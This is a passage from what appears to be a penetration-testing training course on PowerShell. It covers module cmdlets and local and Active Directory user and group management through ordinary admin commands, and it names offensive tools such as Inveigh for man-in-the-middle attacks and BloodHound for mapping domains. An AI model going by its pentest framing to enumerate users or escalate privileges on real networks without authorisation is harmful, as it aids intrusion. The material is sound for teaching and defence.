<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Install-Script</span>                                     1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">New-ScriptFileInfo</span>                                 1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Publish-Module</span>                                     1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Publish-Script</span>                                     1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Register-PSRepository</span>                              1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Save-Module</span>                                        1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Save-Script</span>                                        1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Set-PSRepository</span>                                   1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Test-ScriptFileInfo</span>                                1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Uninstall-Module</span>                                   1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Uninstall-Script</span>                                   1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Unregister-PSRepository</span>                            1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Update-Module</span>                                      1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Update-ModuleManifest</span>                              1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Update-Script</span>                                      1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
<span class="hljs-selector-tag">Function</span>        <span class="hljs-selector-tag">Update-ScriptFileInfo</span>                              1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>    <span class="hljs-selector-tag">PowerShellGet</span>
</code></pre>
<p>This module has many different functions to help us work with and download existing modules from the gallery and make and upload our own. From our function listing, let us give Find-Module a try. One module that will prove extremely useful to system admins is the <a href="https://www.powershellgallery.com/packages/AdminToolbox/11.0.8">AdminToolbox</a> module. It is a collection of several other modules with tools meant for Active Directory management, Microsoft Exchange, virtualization, and many other tasks an admin would need on any given day.</p>
<p><strong>Find-Module</strong></p>
<p>All About Cmdlets and Modules</p>
<pre><code class="lang-powershell-session"><span class="hljs-comment">PS</span> <span class="hljs-comment">C:\htb</span>&gt; <span class="hljs-comment">Find</span><span class="hljs-literal">-</span><span class="hljs-comment">Module</span> <span class="hljs-literal">-</span><span class="hljs-comment">Name</span> <span class="hljs-comment">AdminToolbox</span> 

<span class="hljs-comment">Version</span>    <span class="hljs-comment">Name</span>                                <span class="hljs-comment">Repository</span>           <span class="hljs-comment">Description</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>    <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                                <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>           <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-comment">11</span><span class="hljs-string">.</span><span class="hljs-comment">0</span><span class="hljs-string">.</span><span class="hljs-comment">8</span>     <span class="hljs-comment">AdminToolbox</span>                        <span class="hljs-comment">PSGallery</span>            <span class="hljs-comment">Master</span> <span class="hljs-comment">module</span> <span class="hljs-comment">for</span> <span class="hljs-comment">a</span> <span class="hljs-comment">col</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>
</code></pre>
<p>Like with many other PowerShell cmdlets, we can also search using wildcards. Once we have found a module we wish to utilize, installing it is as easy as <code>Install-Module</code>. Remember that it requires administrative rights to install modules in this manner.</p>
<p><strong>Install-Module</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/admintoolbox.gif" alt="text"></p>
<p>In the image above, we chained <code>Find-Module</code> with <code>Install-Module</code> to simultaneously perform both actions. This example takes advantage of PowerShell&#39;s Pipeline functionality. We will cover this deeper in another section, but for now, it allowed us to find and install the module with one command string. Remember that modern instances of PowerShell will auto-import a module installed the first time we run a cmdlet or function from it, so there is no need to import the module after installing it. This differs from custom modules or modules we bring onto the host (from GitHub, for example). We will have to manually import it each time we want to use it unless we modify our PowerShell Profile. We can find the locations for each specific PowerShell profile <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_profiles?view=powershell-7.2">Here</a>. Besides creating our own modules and scripts or importing them from the PowerShell Gallery, we can also take advantage of <a href="https://github.com/">Github</a> and all the amazing content the IT community has come up with externally. Utilizing <code>Git</code> and <code>Github</code> for now requires the installation of other applications and knowledge of other concepts we have yet to cover, so we will save this for later in the module.</p>
<h4 id="tools-to-be-aware-of">Tools To Be Aware Of</h4>
<p>Below we will quickly list a few PowerShell modules and projects we, as penetration testers and sysadmins, should be aware of. Each of these tools brings a new capability to use within PowerShell. Of course, there are plenty more than just our list; these are just several we find ourselves returning to on every engagement.</p>
<ul>
<li><a href="https://www.powershellgallery.com/packages/AdminToolbox/11.0.8">AdminToolbox</a>: AdminToolbox is a collection of helpful modules that allow system administrators to perform any number of actions dealing with things like Active Directory, Exchange, Network management, file and storage issues, and more.</li>
<li><a href="https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">ActiveDirectory</a>: This module is a collection of local and remote administration tools for all things Active Directory. We can manage users, groups, permissions, and much more with it.</li>
<li><a href="https://github.com/BC-SECURITY/Empire/tree/master/empire/server/data/module\_source/situational\_awareness">Empire / Situational Awareness</a>: Is a collection of PowerShell modules and scripts that can provide us with situational awareness on a host and the domain they are apart of. This project is being maintained by <a href="https://github.com/BC-SECURITY">BC Security</a> as a part of their Empire Framework.</li>
<li><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>: Inveigh is a tool built to perform network spoofing and Man-in-the-middle attacks.</li>
<li><a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">BloodHound / SharpHound</a>: Bloodhound/Sharphound allows us to visually map out an Active Directory Environment using graphical analysis tools and data collectors written in C# and PowerShell.</li>
</ul>
<hr>
<p>Working with PowerShell modules and cmdlets is intuitive and easy to master quickly. This skill will come in handy for the rest of this module since we will be dealing with various tools and topics within PowerShell that may require us to install, import, or examine modules and cmdlets. If you get stuck, be sure to refer back to this section. Now it is time to move on to User and Group management.</p>
<h2 id="user-and-group-management">User and Group Management</h2>
<hr>
<p>As a system administrator, user and group management is a key skill as our users are often our main asset to manage and, usually, an organization&#39;s largest attack vector. As pentesters, understanding how to enumerate, interpret, and take advantage of users and groups is one of the easiest ways to gain access and elevate our privileges during a pentest engagement. This section will cover what users and groups are, how to manage them with PowerShell, and briefly introduce the concept of Active Directory domains and domain users.</p>
<hr>
<h3 id="what-are-user-accounts-">What are User Accounts?</h3>
<p>User accounts are a way for personnel to access and use a host&#39;s resources. In certain circumstances, the system will also utilize a specially provisioned user account to perform actions. When thinking about accounts, we typically run into four different types:</p>
<ul>
<li>Service Accounts</li>
<li>Built-in accounts</li>
<li>Local users</li>
<li>Domain users</li>
</ul>
<h4 id="default-local-user-accounts">Default Local User Accounts</h4>
<p>Several accounts are created in every instance of Windows as the OS is installed to help with host management and basic usage. Below is a list of the standard built-in accounts.</p>
<p><strong>Built-In Accounts</strong></p>
<table>
<thead>
<tr>
<th><strong>Account</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Administrator</code></td>
<td>This account is used to accomplish administrative tasks on the local host.</td>
</tr>
<tr>
<td><code>Default Account</code></td>
<td>The default account is used by the system for running multi-user auth apps like the Xbox utility.</td>
</tr>
<tr>
<td><code>Guest Account</code></td>
<td>This account is a limited rights account that allows users without a normal user account to access the host. It is disabled by default and should stay that way.</td>
</tr>
<tr>
<td><code>WDAGUtility Account</code></td>
<td>This account is in place for the Defender Application Guard, which can sandbox application sessions.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="brief-intro-to-active-directory">Brief Intro to Active Directory</h3>
<p>In a nutshell, <code>Active Directory</code> (AD) is a directory service for Windows environments that provides a central point of management for <code>users</code>, computers, <code>groups</code>, network devices, <code>file shares</code>, group policies, <code>devices</code>, and trusts with other organizations. Think of it as the gatekeeper for an enterprise environment. Anyone who is a part of the domain can access resources freely, while anyone who is not is denied access to those same resources or, at a minimum, stuck waiting in the visitors center.</p>
<p>Within this section, we care about AD in the context of users and groups. We can administer them from PowerShell on <code>any domain joined host</code> utilizing the <code>ActiveDirectory</code> Module. Taking a deep dive into Active Directory would take more than one section, so we will not try here. To learn more about AD, you should check out the <a href="https://academy.hackthebox.com/module/details/74">Introduction to Active Directory module</a>.</p>
<h4 id="local-vs-domain-joined-users">Local vs. Domain Joined Users</h4>
<p><code>How are they different?</code></p>
<p><code>Domain</code> users differ from <code>local</code> users in that they are granted rights from the domain to access resources such as file servers, printers, intranet hosts, and other objects based on user and group membership. Domain user accounts can log in to any host in the domain, while the local user only has permission to access the specific host they were created on.</p>
<p>It is worth looking through the documentation on <a href="https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts">accounts</a> to understand better how the various accounts work together on an individual Windows system and across a domain network. Take some time to look them over and understand the nuances between them. Understanding their uses and the utility of each type of account can make or break a pentesters attempt at privileged access or lateral movement during a penetration test.</p>
<h4 id="what-are-user-groups-">What Are User Groups?</h4>
<p>Groups are a way to sort user accounts logically and, in doing so, provide granular permissions and access to resources without having to manage each user manually. For example, we could restrict access to a specific directory or share so that only users who need access can view the files. On a singular host, this does not mean much to us. However, logical grouping is essential to maintain a proper security posture within a domain of hundreds, if not thousands, of users. From a domain perspective, we have several different types of groups that can hold not only users but end devices like PCs, printers, and even other groups. This concept is too deep of a dive for this module. However, we will talk about how to manage groups for now. If you wish to know more and get a deep dive into Active Directory and how it utilizes groups to maintain security, check out this <a href="https://academy.hackthebox.com/module/details/74">module</a>.</p>
<p><strong>Get-LocalGroup</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; get-localgroup

Name                                Description
----                                -----------
__vmware__                          VMware User <span class="hljs-keyword">Group</span>
Access Control Assistance Operators Members <span class="hljs-keyword">of</span> this <span class="hljs-keyword">group</span> can remotely query authorization attributes <span class="hljs-keyword">and</span> permission...
Administrators                      Administrators have complete <span class="hljs-keyword">and</span> unrestricted access <span class="hljs-keyword">to</span> the computer/domain
Backup Operators                    Backup Operators can <span class="hljs-keyword">override</span> security restrictions <span class="hljs-keyword">for</span> the sole purpose <span class="hljs-keyword">of</span> back...
Cryptographic Operators             Members are authorized <span class="hljs-keyword">to</span> perform cryptographic operations.
Device Owners                       Members <span class="hljs-keyword">of</span> this <span class="hljs-keyword">group</span> can change system-wide settings.
Distributed COM Users               Members are allowed <span class="hljs-keyword">to</span> launch, activate <span class="hljs-keyword">and</span> use Distributed COM objects <span class="hljs-keyword">on</span> this ...
<span class="hljs-keyword">Event</span> Log Readers                   Members <span class="hljs-keyword">of</span> this <span class="hljs-keyword">group</span> can <span class="hljs-keyword">read</span> <span class="hljs-keyword">event</span> logs <span class="hljs-keyword">from</span> local machine
Guests                              Guests have the same access <span class="hljs-keyword">as</span> members <span class="hljs-keyword">of</span> the Users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, <span class="hljs-keyword">except</span> <span class="hljs-keyword">for</span>...
Hyper-V Administrators              Members <span class="hljs-keyword">of</span> this <span class="hljs-keyword">group</span> have complete <span class="hljs-keyword">and</span> unrestricted access <span class="hljs-keyword">to</span> all features <span class="hljs-keyword">of</span> H...
IIS_IUSRS                           Built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">group</span> used <span class="hljs-keyword">by</span> Internet Information Services.
Network Configuration Operators     Members <span class="hljs-keyword">in</span> this <span class="hljs-keyword">group</span> can have some administrative privileges <span class="hljs-keyword">to</span> manage configur...
Performance Log Users               Members <span class="hljs-keyword">of</span> this <span class="hljs-keyword">group</span> may schedule logging <span class="hljs-keyword">of</span> performance counters, enable trace...
Performance Monitor Users           Members <span class="hljs-keyword">of</span> this <span class="hljs-keyword">group</span> can access performance counter data locally <span class="hljs-keyword">and</span> remotely
Power Users                         Power Users are included <span class="hljs-keyword">for</span> backwards compatibility <span class="hljs-keyword">and</span> possess limited adminis...
Remote Desktop Users                Members <span class="hljs-keyword">in</span> this <span class="hljs-keyword">group</span> are granted the right <span class="hljs-keyword">to</span> logon remotely
Remote Management Users             Members <span class="hljs-keyword">of</span> this <span class="hljs-keyword">group</span> can access WMI resources over management protocols (such a...
Replicator                          Supports file replication <span class="hljs-keyword">in</span> a domain
System Managed Accounts <span class="hljs-keyword">Group</span>       Members <span class="hljs-keyword">of</span> this <span class="hljs-keyword">group</span> are managed <span class="hljs-keyword">by</span> the system.
Users                               Users are prevented <span class="hljs-keyword">from</span> making accidental <span class="hljs-keyword">or</span> intentional system-wide changes an...
</code></pre>
<p>Above is an example of the local groups to a standalone host. We can see there are groups for simple things like Administrators and guest accounts, but also groups for specific roles like administrators for virtualization applications, remote users, etc. Let us interact with users and groups now that we understand them.</p>
<h3 id="adding-removing-editing-user-accounts-groups">Adding/Removing/Editing User Accounts &amp; Groups</h3>
<p>Like most other things in PowerShell, we use the <code>get</code>, <code>new</code>, and <code>set</code> verbs to find, create and modify users and groups. If dealing with local users and groups, <code>localuser &amp; localgroup</code> can accomplish this. For domain assets, <code>aduser &amp; adgroup</code> does the trick. If we were not sure, we could always use the <code>Get-Command *user*</code> cmdlet to see what we have access to. Let us give a few of them a try.</p>
<p><strong>Identifying Local Users</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-LocalUser  

Name               Enabled Description
<span class="hljs-comment">----               ------- -----------</span>
Administrator      False   Built-<span class="hljs-keyword">in</span> account <span class="hljs-keyword">for</span> administering <span class="hljs-keyword">the</span> computer/domain
DefaultAccount     False   A user account managed <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">system</span>.
DLarusso           True    High kick specialist.
Guest              False   Built-<span class="hljs-keyword">in</span> account <span class="hljs-keyword">for</span> guest access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> computer/domain
sshd               True
WDAGUtilityAccount False   A user account managed <span class="hljs-keyword">and</span> used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">for</span> Windows Defender A...
</code></pre>
<p><code>Get-LocalUser</code> will display the users on our host. These users only have access to this particular host. Let us say that we want to create a new local user named <code>JLawrence</code>. We can accomplish the task using <code>New-LocalUser</code>. If we are unsure of the proper syntax, please do not forget about the <code>Get-Help</code> Command. When creating a new local user, the only real requirement from a syntax perspective is to enter a <code>name</code> and specify a <code>password</code> (or <code>-NoPassword</code>). All other settings, such as a description or account expiration, are optional.</p>
<p><strong>Creating A New User</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt;  <span class="hljs-keyword">New</span>-LocalUser -Name <span class="hljs-string">"JLawrence"</span> -NoPassword

Name      Enabled Description
<span class="hljs-comment">----      ------- -----------</span>
JLawrence <span class="hljs-literal">True</span>
</code></pre>
<p>Above, we created the user <code>JLawrence</code> and did not set a password. So this account is active and can be logged in without a password. Depending on the version of Windows we are using, by not setting a Password, we are flagging to windows that this is a Microsoft live account, and it attempts to login in that manner instead of using a local password.</p>
<p>If we wish to modify a user, we could use the <code>Set-LocalUser</code> cmdlet. For this example, we will modify <code>JLawrence</code> and set a password and description on his account.</p>
<p><strong>Modifying a User</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; $Password = Read-Host -AsSecureString
****************
PS C:\htb&gt; <span class="hljs-built_in">Set</span>-LocalUser -<span class="hljs-built_in">Name</span> <span class="hljs-string">"JLawrence"</span> -Password $Password -Description <span class="hljs-string">"CEO EagleFang"</span>
PS C:\htb&gt; Get-LocalUser  

<span class="hljs-built_in">Name</span>               Enabled Description
----               ------- -----------
Administrator      <span class="hljs-literal">False</span>   Built-<span class="hljs-built_in">in</span> account <span class="hljs-keyword">for</span> administering the computer/domain
DefaultAccount     <span class="hljs-literal">False</span>   A user account managed by the system.
demo               <span class="hljs-literal">True</span>
Guest              <span class="hljs-literal">False</span>   Built-<span class="hljs-built_in">in</span> account <span class="hljs-keyword">for</span> guest access <span class="hljs-keyword">to</span> the computer/domain
JLawrence          <span class="hljs-literal">True</span>    CEO EagleFang
</code></pre>
<p>As for making and modifying users, it is as simple as what we see above. Now, let us move on to checking out groups. If it feels like a bit of an echo...well, it is. The commands are similar in use.</p>
<p><strong>Get-LocalGroup</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-LocalGroup  

Name                                Description
----                                -----------
Access Control Assistance Operators Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> remotely query authorization attr...
Administrators                      Administrators have complete <span class="hljs-keyword">and</span> unrestricted access to the...
Backup Operators                    Backup Operators can override security restrictions for the...
Cryptographic Operators             Members are authorized to perform cryptographic <span class="hljs-keyword">operations</span>.
Device Owners                       Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> change system-wide settings.
Distributed COM Users               Members are allowed to launch, activate <span class="hljs-keyword">and</span> use Distributed...
Event Log Readers                   Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> <span class="hljs-keyword">read</span> event logs from local machine
Guests                              Guests have the same access as members of the Users <span class="hljs-keyword">group</span> <span class="hljs-title">b</span>...
Hyper-V Administrators              Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">have</span> complete <span class="hljs-keyword">and</span> unrestricted access...
IIS_IUSRS                           Built-<span class="hljs-keyword">in</span> <span class="hljs-keyword">group</span> <span class="hljs-title">used</span> by Internet <span class="hljs-literal">Inf</span>ormation Services.
Network Configuration Operators     Members <span class="hljs-keyword">in</span> this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> have some administrative privileg...
Performance Log Users               Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">may</span> schedule logging of performance c...
Performance <span class="hljs-literal">Monitor</span> Users           Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> access performance counter data l...
Power Users                         Power Users are included for backwards compatibility <span class="hljs-keyword">and</span> po...
Remote Desktop Users                Members <span class="hljs-keyword">in</span> this <span class="hljs-keyword">group</span> <span class="hljs-title">are</span> granted the right to logon remotely
Remote Management Users             Members of this <span class="hljs-keyword">group</span> <span class="hljs-title">can</span> access WMI resources over managem...
Replicator                          Supports file replication <span class="hljs-keyword">in</span> a domain
System Managed Accounts <span class="hljs-keyword">Group</span>       <span class="hljs-title">Members</span> of this <span class="hljs-keyword">group</span> <span class="hljs-title">are</span> managed by the system.
Users                               Users are prevented from making accidental <span class="hljs-keyword">or</span> intentional s...

PS C:\Windows\system32&gt; Get-LocalGroupMember -Name <span class="hljs-string">"Users"</span>

ObjectClass Name                             PrincipalSource
----------- ----                             ---------------
<span class="hljs-keyword">User</span>        <span class="hljs-title">DESKTOP-B3MFM77</span>\demo             Local
<span class="hljs-keyword">User</span>        <span class="hljs-title">DESKTOP-B3MFM77</span>\JLawrence        Local
<span class="hljs-keyword">Group</span>       <span class="hljs-title">NT</span> AUTHORITY\Authenticated Users Unknown
<span class="hljs-keyword">Group</span>       <span class="hljs-title">NT</span> AUTHORITY\INTERACTIVE         Unknown
</code></pre>
<p>In the output above, we ran the <code>Get-LocalGroup</code> cmdlet to get a printout of each group on the host. In the second command, we decided to inspect the <code>Users</code> group and see who is a member of said group. We did this with the <code>Get-LocalGroupMember</code> command. Now, if we wish to add another group or user to a group, we can use the <code>Add-LocalGroupMember</code> command. We will add <code>JLawrence</code> to the <code>Remote Desktop Users</code> group in the example below.</p>
<p><strong>Adding a Member To a Group</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-keyword">Add</span><span class="bash">-LocalGroupMember -Group <span class="hljs-string">"Remote Desktop Users"</span> -Member <span class="hljs-string">"JLawrence"</span>
</span>PS C:\htb&gt; Get-LocalGroupMember -Name <span class="hljs-string">"Remote Desktop Users"</span> 

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
<span class="hljs-keyword">User</span>        DESKTOP-B3MFM77\JLawrence Local
</code></pre>
<p>After running the command, we checked the group membership and saw that our user was indeed added to the Remote Desktop Users group. Maintaining local users and groups is simple and does not require external modules. Managing Active Directory Users and Groups requires a bit more work.</p>
<h4 id="managing-domain-users-and-groups">Managing Domain Users and Groups</h4>
<p>Before we can access the cmdlets we need and work with Active Directory, we must install the <code>ActiveDirectory</code> PowerShell Module. If you installed the AdminToolbox, the AD module might already be on your host. If not, we can quickly grab the AD modules and get to work. One requirement is to have the optional feature <code>Remote System Administration Tools</code> installed. This feature is the only way to get the official ActiveDirectory PowerShell module. The edition in AdminToolbox and other Modules is repackaged, so use caution.</p>
<p><strong>Installing RSAT</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Get</span>-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online

<span class="hljs-keyword">Path</span>          :  
Online        : <span class="hljs-keyword">True</span>  
RestartNeeded : <span class="hljs-keyword">False</span>
</code></pre>
<p>The above command will install <code>ALL</code> RSAT features in the Microsoft Catalog. If we wish to stay lightweight, we can install the package named <code>Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0</code>. Now we should have the ActiveDirectory module installed. Let us check.</p>
<p><strong>Locating The AD Module</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Module -Name ActiveDirectory -ListAvailable 
<span class="hljs-symbol">
    Directory:</span> C:\Windows\system32\WindowsPowerShell\v1<span class="hljs-meta">.0</span>\Modules


ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   <span class="hljs-number">1.0</span><span class="hljs-meta">.1</span><span class="hljs-meta">.0</span>    ActiveDirectory                     {<span class="hljs-keyword">Add</span>-ADCentralAccessPolicyMember, <span class="hljs-keyword">Add</span>-ADComputerServiceAccount, <span class="hljs-keyword">Add</span>-ADDomainControllerPasswordReplicationPolicy, <span class="hljs-keyword">Add</span>-A...
</code></pre>
<p>Nice. Now that we have the module, we can get started with AD <code>User</code> and <code>Group</code> management. The easiest way to locate a specific user is by searching with the <code>Get-ADUser</code> cmdlet.</p>
<p><strong>Get-ADUser</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; Get-ADUser -Filter *

<span class="hljs-string">DistinguishedName :</span> CN=user14,CN=Users,DC=greenhorn,DC=corp
<span class="hljs-string">Enabled           :</span> True
<span class="hljs-string">GivenName         :</span>
<span class="hljs-string">Name              :</span> user14
<span class="hljs-string">ObjectClass       :</span> user
<span class="hljs-string">ObjectGUID        :</span> bef9787d<span class="hljs-number">-2716</span><span class="hljs-number">-4</span>dc9<span class="hljs-number">-8e8</span>f-f8037a72c3d9
<span class="hljs-string">SamAccountName    :</span> user14
<span class="hljs-string">SID               :</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1480833693</span><span class="hljs-number">-1324064541</span><span class="hljs-number">-2711030367</span><span class="hljs-number">-1110</span>
<span class="hljs-string">Surname           :</span>
<span class="hljs-string">UserPrincipalName :</span>

<span class="hljs-string">DistinguishedName :</span> CN=sshd,CN=Users,DC=greenhorn,DC=corp
<span class="hljs-string">Enabled           :</span> True
<span class="hljs-string">GivenName         :</span>
<span class="hljs-string">Name              :</span> sshd
<span class="hljs-string">ObjectClass       :</span> user
<span class="hljs-string">ObjectGUID        :</span> <span class="hljs-number">7</span>a324e98<span class="hljs-number">-00e4</span><span class="hljs-number">-480</span>b<span class="hljs-number">-8</span>a1a-fa465d558063
<span class="hljs-string">SamAccountName    :</span> sshd
<span class="hljs-string">SID               :</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1480833693</span><span class="hljs-number">-1324064541</span><span class="hljs-number">-2711030367</span><span class="hljs-number">-1112</span>
<span class="hljs-string">Surname           :</span>
<span class="hljs-string">UserPrincipalName :</span>

<span class="hljs-string">DistinguishedName :</span> CN=TSilver,CN=Users,DC=greenhorn,DC=corp
<span class="hljs-string">Enabled           :</span> True
<span class="hljs-string">GivenName         :</span>
<span class="hljs-string">Name              :</span> TSilver
<span class="hljs-string">ObjectClass       :</span> user
<span class="hljs-string">ObjectGUID        :</span> a19a6c8a<span class="hljs-number">-000</span>a<span class="hljs-number">-4</span>cbf-aa14<span class="hljs-number">-0</span>c7fca643c37
<span class="hljs-string">SamAccountName    :</span> TSilver
<span class="hljs-string">SID               :</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1480833693</span><span class="hljs-number">-1324064541</span><span class="hljs-number">-2711030367</span><span class="hljs-number">-1602</span>
<span class="hljs-string">Surname           :</span>
<span class="hljs-string">UserPrincipalName :</span>  

&lt;SNIP&gt;
</code></pre>
<p>The parameter <code>-Filter *</code> lets us grab all users within Active Directory. Depending on our organization&#39;s size, this could produce a ton of output. We can use the <code>-Identity</code> parameter to perform a more specific search for a user by <code>distinguished name, GUID, the objectSid, or SamAccountName</code>. Do not worry if these options seem like gibberish to you; that is all right. The specifics of these are not important right now; for more reading on the topic, check out <a href="https://learn.microsoft.com/en-us/windows/win32/ad/naming-properties">this article</a> or the <a href="https://academy.hackthebox.com/course/preview/introduction-to-active-directory">Intro To Active Directory</a> module. We are going to search for the user <code>TSilver</code> now.</p>
<p><strong>Get a Specific User</strong></p>
<p>User and Group Management</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt;  Get-ADUser -Identity TSilver


<span class="hljs-string">DistinguishedName :</span> CN=TSilver,CN=Users,DC=greenhorn,DC=corp
<span class="hljs-string">Enabled           :</span> True
<span class="hljs-string">GivenName         :</span>
<span class="hljs-string">Name              :</span> TSilver
<span class="hljs-string">ObjectClass       :</span> user
<span class="hljs-string">ObjectGUID        :</span> a19a6c8a<span class="hljs-number">-000</span>a<span class="hljs-number">-4</span>cbf-aa14<span class="hljs-number">-0</span>c7fca643c37
<span class="hljs-string">SamAccountName    :</span> TSilver
<span class="hljs-string">SID               :</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1480833693</span><span class="hljs-number">-1324064541</span><span class="hljs-number">-2711030367</span><span class="hljs-number">-1602</span>
<span class="hljs-string">Surname           :</span>
<span class="hljs-string">UserPrincipalName :</span>
</code></pre>
<p>We can see from the output several pieces of information about the user, including:</p>
<ul>
<li><code>Object Class</code>: which specifies if the object is a user, computer, or another type of object.</li>
<li><code>DistinguishedName</code>: Specifies the object&#39;s relative path within the AD schema.</li>
